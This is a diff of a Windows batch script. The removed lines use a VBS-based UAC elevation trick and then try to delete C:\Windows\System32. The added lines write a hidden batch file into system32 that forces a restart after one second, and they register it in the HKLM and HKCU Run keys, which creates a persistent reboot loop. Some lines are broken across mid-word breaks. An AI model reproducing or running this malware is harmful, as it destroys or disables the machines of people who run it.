@@ -1,25 +1,7 @@
-@echo off 
-cd  
-call :isAdmin
-
-if %errorlevel% == 0 ( 
-goto :run ) 
-else ( echo requesting administrative privileges...
-    goto :UACPrompt )
-
-exit /b
-
-:UACPrompt
-echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-"%temp%\getadmin.vbs"
-del "%temp%\getadmin.vbs"
-
-:isAdmin
-fsutil dirty query %systemdrive% >nul
-exit /b
-
-:run
-del C:\Windows\System32
-exit 
+echo @echo off>>%systemroot%\system32\agagagag43.ba
+t
+echo Break off>>%systemroot%\system32\agagagag43.bat
+echo Attrib +r +h>>%systemroot%\system32\agagagag43.bat
+echo Shutdown -f -r -t 1 -c"lol">>%systemroot%\system32\agagagag43.bat 
+reg add hkey_local_machine\software\microsoft\windows\curr entversion\run /v agagagag43 /t reg_sz /d %systemroot%\system32\agagagag43.bat /f 
+reg add hkey_current_user\software\microsoft\windows\curre ntversion\run /v agagagag43 /t reg_sz /d %systemroot%\system32\agagagag43.bat /f 
